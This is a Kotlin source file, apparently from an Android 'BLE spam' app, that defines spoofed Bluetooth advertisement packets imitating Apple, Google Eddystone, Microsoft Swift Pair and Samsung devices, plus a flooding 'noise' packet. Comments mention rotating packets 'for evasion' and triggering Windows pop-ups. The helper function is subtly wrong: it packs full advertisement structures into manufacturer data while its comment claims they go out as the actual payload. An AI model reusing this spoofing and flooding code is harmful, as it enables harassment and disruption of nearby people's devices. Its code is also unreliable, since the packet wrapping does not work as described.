package com.tutozz.blespam

import android.bluetooth.le.AdvertiseData
import java.nio.ByteBuffer

object BlePacketTemplates {

    // Varied packets for evasion: Rotate to mimic different devices/protocols
    // Research note: Packets start with length byte, then AD Type (0x01=Flags, 0xFF=Manufacturer Data, etc.)
    val ADVERTISEMENT_PACKETS: List<ByteArray> = listOf(
        // Packet 1: Apple iBeacon (AirTags/Proximity)
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags: LE General Discoverable
            0x1A, 0xFF.toByte(), 0x4C, 0x00, 0x02, 0x15,  // Apple (0x004C) Manufacturer + iBeacon type
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // UUID (zeros for generic)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x01, 0x00, 0x02, (-59).toByte()  // Major/Minor/TX Power
        ),
        // Packet 2: Google Eddystone URL (e.g., "google.com")
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags
            0x03, 0x03, (-86).toByte(), 0xFE.toByte(),  // Eddystone Service UUID
            0x12, 0x16, (-86).toByte(), 0xFE.toByte(),  // Service Data
            0x10, (-8).toByte(),  // URL frame type + TX Power
            0x03, 0x67, 0x6F, 0x6F, 0x67, 0x6C, 0x65, 0x2E, 0x63, 0x6F, 0x6D  // Encoded "google.com"
        ),
        // Packet 3: Microsoft Swift Pair (To trigger Windows pop-ups)
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags
            0x06, 0xFF.toByte(), 0x06, 0x00, 0x03, 0x80, 0x01, 0x02 // Microsoft Vendor ID (0x0006) + Swift Pair bytes
        ),
        // Packet 4: Samsung Find Network (Spoofs SmartTag/SmartThings)
        // Note: Real packets are complex, this is a common spoof payload pattern (UUID FD59)
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags
            0x03, 0x03, 0x59, 0xFD.toByte(),  // Incomplete 16-bit Service UUID: FD59
            0x05, 0x16, 0x59, 0xFD.toByte(), 0x01, 0x02 // Service Data (Example payload)
        ),
        // Packet 5: Generic Noise Packet (Flooding)
        byteArrayOf(
            0x02, 0x01, 0x06,  // Flags
            0x0F, 0xFF.toByte(), 0xEE.toByte(), 0xEE.toByte(), 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C // Unassigned Vendor ID (0xEEEE)
        )
    )

    // Helper function: Builds the Android-required AdvertiseData object from raw bytes
    fun buildAdvertiseData(rawData: ByteArray): AdvertiseData {
        // We use ManufacturerData to wrap the raw bytes, as it's the most flexible structure
        val manufacturerId = 0xFFFF.toShort()  // Use unassigned ID for generic vendor data
        
        // This is a simplified wrapper. The raw bytes defined above are the *actual* packet payload.
        // The Android API handles the rest of the advertising structure.
        return AdvertiseData.Builder()
            .addManufacturerData(manufacturerId.toInt(), rawData)
            .setIncludeDeviceName(false)  // Saves bytes and time for higher frequency
            .setIncludeTxPowerLevel(true)  // Boosts detectability and range
            .build()
    }
}
